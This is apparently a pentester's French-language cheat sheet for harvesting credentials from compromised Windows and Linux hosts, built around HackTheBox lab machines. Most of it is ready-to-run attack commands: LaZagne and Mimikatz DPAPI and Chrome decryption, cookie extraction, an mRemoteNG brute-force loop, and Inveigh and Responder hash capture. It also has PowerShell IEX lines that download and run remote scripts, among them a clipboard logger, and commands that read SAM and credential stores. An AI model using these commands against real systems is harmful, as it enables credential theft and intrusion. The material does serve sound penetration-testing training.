

[[#WINDOWS]]
[[#LINUX]]

# WINDOWS


- [ ] [[#LaZagne]]
- [ ] [[#SessionGopher]]
- [ ] [[#Recherche de pattern dans fichiers]]
- [ ] [[#Rechercher les fichiers contenant un string dans le nom]]
- [ ] [[#Recycle Bin]]
- [ ] [[#Fichiers de dictionnaires]]
- [ ] [[#mRemoteNG config file]]
- [ ] [[#Fichiers d'installations non supprimés]]
- [ ] [[#PowerShell History File]]
- [ ] [[#PowerShell Credentials]]
- [ ] [[#StickyNotes]]
- [ ] [[#Pass en clair dans le registre]]
- [ ] [[#Journaux d'evenements]]
- [ ] [[#Pass WIFI]]
- [ ] [[#DPAPI]]
- [ ] [[#Browser Credentials]]
- [ ] [[#Firefox Cookies]]
- [ ] [[#Chromium Cookies]]
- [ ] [[#Clipboard]]
- [ ] [[#Sniffing Wireshark / Net-Creds / PCredz (Sudo)]]
- [ ] [[#Keylogger]]


Keywords à rechercher

|               |              |             |
| ------------- | ------------ | ----------- |
| Passwords     | Passphrases  | Keys        |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |
| password      | pass         | login       |
- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in web.config files on dev machines and IT shares
- unattend.xml
- Passwords in the AD user or computer description fields
- KeePass databases --> pull hash, crack and get loads of access.
- Found on user systems and shares
- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint


Fichiers intéressants

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```


## LaZagne

```cmd
.\laZagne.exe all
```

## SessionGopher

https://github.com/Arvanaghi/SessionGopher

> [!TIP]
> Extract PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.


```
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell
Import-Module .\SessionGopher.ps1
```

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```


## User/Computer Description Field

> [!TIP]
> Peut contenir des mots de passe.
> 

Description utilisateur

```powershell-session
Get-LocalUser
```

Description ordinateur

```powershell-session
Get-WmiObject -Class Win32_OperatingSystem | select Description
```



## Recherche de pattern dans fichiers

Afficher tous les fichiers dans C:/Users (Hidden + non Hidden)

```
Get-ChildItem -Recurse -Force c:/users/ 
```

Depuis le répertoire parent

```cmd
findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.py *.yml *.kdb* *.log *.* *.xls* *.doc* *.sql*
```

```Powershell
Get-ChildItem -Recurse -Force -Path C:\Users | Select-String -Pattern "password"
```


## Rechercher les fichiers contenant un string dans le nom

```powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include *cred* -File
```

Rechercher tous les fichiers conf, db, txt, docx, xlsx, zip ....

```powershell
Get-ChildItem -Recurse -Force -Path C:\Users -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.git,*.ps1,*.py,*.yml,*.kdb*,*.log,*.xls*,*.doc*,*.zip,*.7z,*.xltx,*.csv,*.od*,*.pdf,*.pot,*.pot*,*.pp*,*.sql* -File
```

fichiers xlsx

```powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include *.xls* -File
```

Fichiers docx

```powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include *.doc* -File
```

Fichiers txt

```powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include *.txt* -File
```


## Recycle Bin

Rechercher des fichiers dans la corbeille

```Powershell
Get-ChildItem -Recurse -Force -Path 'C:\$RECYCLE.BIN'
```



## Fichiers de dictionnaires

Mots ajoutés au dictionnaire (pour enlever le trait rouge en dessous)

Chrome

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## Fichiers d'installations non supprimés

unattend.xml (contient pass en clair ou base64)(depuis c:)

```powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include unattend.xml -File
```

## Fichiers web.config

```Powershell
Get-ChildItem -Recurse -Force -Path C:\ -Include web.config -File
```


## mRemoteNG config file

```powershell
ls C:\Users\<user>\AppData\Roaming\mRemoteNG
```

```powershell
cat C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml
```

déchiffrer le mot de passe

https://github.com/haseebT/mRemoteNG-Decrypt

```shell
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

Si master password (ValueError: MAC check failed)-> for loop pour le bruteforce

```shell
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```

Si master password connu

```shell
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p <master_password>
```



## PowerShell History File
 
 Fichier d'historique : 
 
 - C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

1. Confirmer l'emplacement du fichier d'historique

```powershell
(Get-PSReadLineOption).HistorySavePath
```

2. Boucle foreach pour lire l'historique de chaque user

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```


## PowerShell Credentials

Si creds importés depuis un autre fichier dans un script, possible de déchiffrer depuis la session de l'utilisateur (utilise DPAPI)

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```powershell
$credential.GetNetworkCredential().username
```

```powershell
$credential.GetNetworkCredential().password
```


## StickyNotes


Emplacement:

- C:\Users\%userprofile%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

Transférer le fichier de db sur machine attaquant et lire avec DB Browser SQLite ou strings : 

```shell
strings plum.sqlite-wal
```

ou utiliser module https://github.com/RamblingCookieMonster/PSSQLite depuis machine cible

```powershell
Import-Module .\PSSQLite.psd1
```

```powershell
 $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
```

```powershell
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```


## Pass en clair dans le registre

#### Autologon

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Putty

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```


## Journaux d'evenements

> [!TIP]
> 
> Rechercher dans les journaux d'evenement (necessite de faire partie du groupe Admin ou Event Log Readers)


```cmd
net localgroup "Event Log Readers"
```


#### Wevtutil

Rechercher dans les logs Security le string /user en local

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Rechercher dans les logs Security le string /user sur un ordinateur distant avec des identifiants

```cmd
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

#### Get-WinEvent


> [!TIP]
> Necessite les droits d'admin ou droits spécifiques sur la clé de registre HKLM\System\CurrentControlSet\Services\Eventlog\Security

Rechercher des creds dans les logs de création de processus (id 4688)

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} -Credential $creds
```

Rechercher les logs powershell egalement (id 4104)
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.5&viewFallbackFrom=powershell-7.1

## Pass WIFI

Afficher les profiles

```cmd
netsh wlan show profile
```

Pass d'un profil en clair

```cmd
netsh wlan show profile ilfreight_corp key=clear
```


## DPAPI

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

```powershell
$username = "<user>"
Get-ChildItem -Recurse -Force "c:\users\$username\Appdata\Local\Microsoft\Vault\"
Get-ChildItem -Recurse -Force "c:\users\$username\AppData\Local\Microsoft\Credentials\"
Get-ChildItem -Recurse -Force "c:\users\$username\AppData\Roaming\Microsoft\Credentials\"
Get-ChildItem -Recurse -Force "c:\users\$username\AppData\Roaming\Microsoft\Vault\"
Get-ChildItem -Recurse -Force "c:\ProgramData\Microsoft\Vault\"
Get-ChildItem -Recurse -Force "C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault"
Get-ChildItem -Recurse -Force "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials"
```

### MASTERKEY

Emplacement de la masterkey :

```powershell
$username = "<user>"
Get-ChildItem -Recurse -Force "c:\users\$username\AppData\Roaming\Microsoft\Protect\"
```
#### Mimikatz

déchiffrer la masterkey

```
dpapi::masterkey /in:"C:\Users\$username\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected
```

#### Impacket

déchiffrer la masterkey

```
impacket-dpapi masterkey -file masterkeyFile -password user_password -sid S-1-5-21-2951410989-3737899026-1721081736-1119
```

### CREDENTIALS

#### Mimikatz

déchiffrer credentials avec la masterkey

```
dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A /masterkey:masterkey 
```
#### Impacket

déchiffrer credentials avec la masterkey

```
impacket-dpapi credential -file ./AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 -key masterkey
```


### VAULT

Lister les vaults avec commande native

```
vaultcmd /list
vaultcmd /listcreds:"Informations d'identification Windows" /all
```

#### SharpDPAPI

déchiffrer les vault avec remote procedure call

```
SharpDPAPI.exe credentials /rpc
```

#### Mimikatz

déchiffrer les vault avec masterkey

```
dpapi::vault /cred:"Path\to\file.vcrd" /policy:"path\to\Policy.vpol" /masterkey:masterkey
```

#### Impacket

déchiffrer les vault avec masterkey

```
impacket-dpapi vault -vcrd file.vcrd -vpol file.vpol -key masterkey
```

### Cmdkey Saved Credentials

Creds stockés dans le gestionnaire d'identification

```cmd
cmdkey /list
```

rejouer les creds avec runas

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```


### Machine DPAPI Creds + Vault + Certificates

DPAPI SYSTEM

```
SharpDPAPI.exe machinetriage
```



### Browser Credentials

#### Mimikatz

> [!warning]
> Nécessite d'avoir une session active avec le compte cible dans le cas d'un compte de domaine. (Peut ne pas fonctionner avec une session Winrm, privilégier RDP)

Récupérer StateKey du user dans un premier temps.

```powershell
(gc "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
```

Déchiffrer avec encrypted StateKey depuis Mimikatz

```
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /encryptedkey:RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAncJwnVImWR7bUoLLRfa9/EAAAABwAAABHAG8AbwBnAGwAZQAgAEMAaAByAG8AbQBlAAAAA2YAAMAAAAAQAAAAsR/KfZ2j7nGaBsSBrtx5igAAAAAEgAAAoAAAABAAAACdgmiYa1tun6mnpvJ2Pkv4KAAAAP7DCG+OdN2pHpNz/0VeH3yz0yfxLTHqZPb6FO3VobecG5Xocf/FrcsUAAAAbGTwlT4u7y2DRvLV8fBtxcQT9Es= /unprotect
```

#### SharpChrome

https://github.com/GhostPack/SharpDPAPI

```powershell
.\SharpChrome.exe logins /unprotect
```

#### Lazagne

```cmd
lazagne.exe browsers
```



## Firefox Cookies

https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py

Copier la basee de données qui stocke les cookies

```powershell
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Extraire les cookies

```shell
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite"
```

injecter le cookie.


## Chromium Cookies

DB chiffrée avec les DPAPI

#### SharpChromium

https://github.com/djhohnstein/SharpChromium
https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpChromium.ps1


Se connecte à la db, déchiffre les cookies et retourne le résultat en json

Récupérer SharpChromium en file less

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
```

```powershell
Invoke-SharpChromium -Command "cookies slack.com"
```

si erreur car fichier de db introuvable, copier la db vers la destination chéckée par SharpChromium

```powershell
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```


## Clipboard

Récupérer les données dans le presse papier

http://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
```

Lancer et patienter jusqu'à ce que des données arrivent

```powershell
Invoke-ClipboardLogger
```


## Sniffing Wireshark / Net-Creds / PCredz (Sudo)


1. Lancer Wireshark afin de capturer le trafic.
2. Sauvegarder la capture au format pcap.
3. Lancer net-creds sur le pcap afin d'identifier tous les identifiants en clair https://github.com/DanMcInerney/net-creds

```
python net-creds.py -p pcapfile
```

Pcredz -> https://github.com/lgandx/PCredz

```
python3 ./Pcredz -f pcapfile
```


## Sniffing Inveigh


A lancer dans contexte administrateur

https://github.com/Kevin-Robertson/Inveigh

Powershell (plus maintenue)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell
Import-Module .\Inveigh.ps1
```

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C#

```powershell
.\Inveigh.exe
```

Presser esc pour entrer/sortir du mode interactif

```
HELP
```

Afficher les challenges capturés

```
GET NTLMV2UNIQUE
```

Afficher les usernames

```
GET NTLMV2USERNAMES
```


## Keylogger

Capture toutes les frappes au clavier

Keylogger Meterpreter



---
# LINUX

- [ ] [[#Rechercher dans l'historique]]
- [ ] [[#[LaZagne](https //raw.githubusercontent.com/AlessandroZ/LaZagne/refs/heads/master/Linux/laZagne.py)|Lazagne]]
- [ ] [[#Rechercher les clés SSH]]
- [ ] [[#Rechercher les fichiers contenant le mot pass dans /etc]]
- [ ] [[#Rechercher les fichiers de configuration]]
- [ ] [[#Rechercher les fichiers de base de données]]
- [ ] [[#Rechercher les fichiers de sauvegardes]]
- [ ] [[#Rechercher les fichiers texte]]
- [ ] [[#Rechercher les scripts]]
- [ ] [[#Recherche de fichiers keytab (Kerberos)]]
- [ ] [[#Recherche de fichiers encodés]]
- [ ] [[#Recherche d'archives protégées]]
- [ ] [[#Recherche de fichiers OpenVPN]]
- [ ] [[#Afficher les mots user, password et pass des fichiers cnf]]
- [ ] [[#Afficher les cronjobs]]
- [ ] [[#Fichiers de logs]]
- [ ] [[#Browsers]]
- [ ] [[#Sniffing Tcpdump / Net-Creds / PCredz (Sudo)]]
- [ ] [[#Sniffing Responder]]

|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|||

## Rechercher dans l'historique

```shell
history
```

```shell
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

## [LaZagne](https://raw.githubusercontent.com/AlessandroZ/LaZagne/refs/heads/master/Linux/laZagne.py)

```shell
sudo python2.7 laZagne.py all
```

## Rechercher les clés SSH

Clé privé

```shell
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

Clé publique

```shell
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

## Rechercher les fichiers contenant le mot pass dans /home

```bash
egrep -rRni 'pass' --color /home/  2>/dev/null 
```

## Rechercher les fichiers contenant le mot pass dans /var/www

```bash
egrep -rRni 'pass' --color /var/www/  2>/dev/null 
```

## Rechercher les fichiers de configuration

```bash
find / ! -path "*/proc/*" -iname "*.cnf" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.conf" -type f 2>/dev/null
```

```shell
find / ! -path "*/proc/*" -iname "*.configuration" -type f 2>/dev/null
```

```shell
find / ! -path "*/proc/*" -iname "*conf*" -type f 2>/dev/null
```

```shell
find / ! -path "*/proc/*" -iname "configuration.*" -type f 2>/dev/null
```

boucle for

```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / ! -path "*/proc/*" -iname *$l 2>/dev/null | grep -vE "lib|fonts|share|core|proc|run|sys";done
```


grep sur le mot pass pour tous les fichiers .conf dans un répertoire

```bash
egrep -rRni 'pass' /path/to/*conf* -C 5
```

## Rechercher les fichiers de base de données

```shell
find / ! -path "*/proc/*" -iname "*.dat" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.db" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.*db" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.db*" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.sql*" -type f 2>/dev/null
```

boucle for

```shell
for l in $(echo ".sql* .*db* .db");do echo -e "\nDB File extension: " $l; find / ! -path "*/proc/*" -iname *$l -type f 2>/dev/null | grep -vE "doc|lib|headers|share|man|proc|run|sys";done
```

## Rechercher les fichiers de sauvegardes

```bash
find / ! -path "*/proc/*" -iname "*.bak" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.swap" -type f 2>/dev/null
```

boucle for

```shell
for l in $(echo ".bak .swap");do echo -e "\nDB File extension: " $l; find / ! -path "*/proc/*" -name *$l 2>/dev/null;done
```

## Rechercher les fichiers texte

```shell
find /home/* -type f -name "*.txt" 2>/dev/null
```

## Rechercher les scripts

```bash
find / ! -path "*/proc/*" -iname "*.py" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.pyc" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.sh" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.go" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.jar" -type f 2>/dev/null
```

```bash
find / ! -path "*/proc/*" -iname "*.c" -type f 2>/dev/null
```

boucle for

```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / ! -path "*/proc/*" -name *$l -type f 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

## Recherche de fichiers keytab (Kerberos)

```shell
find / ! -path "*/proc/*" -name *keytab* -ls 2>/dev/null
```

```shell
find / ! -path "*/proc/*" -name *.kt -ls 2>/dev/null
```

## Recherche de fichiers encodés
https://fileinfo.com/filetypes/encoded

```shell
for ext in $(echo ".xls* .xltx .csv .od* .doc* .pdf .pot* .pp*");do echo -e "\nFile extension: " $ext; find / ! -path "*/proc/*" -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

## Recherche d'archives protégées
https://fileinfo.com/filetypes/compressed

```shell
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

```shell
for ext in $(cat compressed_ext.txt);do echo -e "\nFile extension: " $ext; find / ! -path "*/proc/*" -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```


## Recherche de fichiers OpenVPN

```sh
find /home/* -type f -name "*.ovpn" 2>/dev/null
```


## Afficher les mots user, password et pass des fichiers cnf

```shell
for i in $(find / ! -path "*/proc/*" -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```


## Afficher les cronjobs

```shell
cat /etc/crontab 
```

```shell
ls -la /etc/cron.*/
```

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```


## Fichiers de logs

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|

```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```


## Browsers

Firefox

```shell
ls -la .mozilla/firefox/ | grep default 
```

```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

Déchiffrer les creds avec [firefox_decrypt](https://github.com/unode/firefox_decrypt)

```shell
python3.9 firefox_decrypt.py
```



Tester également cookies.sqlite

```
cp /home/<user>/.mozilla/firefox/*.default-release/cookies.sqlite .
```

```shell
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite"
```


## Sniffing Tcpdump / Net-Creds / PCredz (Sudo)


1. Lancer Tcpdump afin de capturer le trafic.

```
sudo tcpdump -i ens224 
```


2. Lancer net-creds sur le pcap afin d'identifier tous les identifiants en clair https://github.com/DanMcInerney/net-creds

```
python net-creds.py -p pcapfile
```

Pcredz -> https://github.com/lgandx/PCredz

```
python3 ./Pcredz -f pcapfile
```


## Sniffing Responder

Lancer responder pour capturer le challenge response

```sh
cd /usr/share/responder/ && sudo sed -i 's/On/Off/g' /usr/share/responder/Responder.conf && sudo python3 Responder.py -I eth0
```



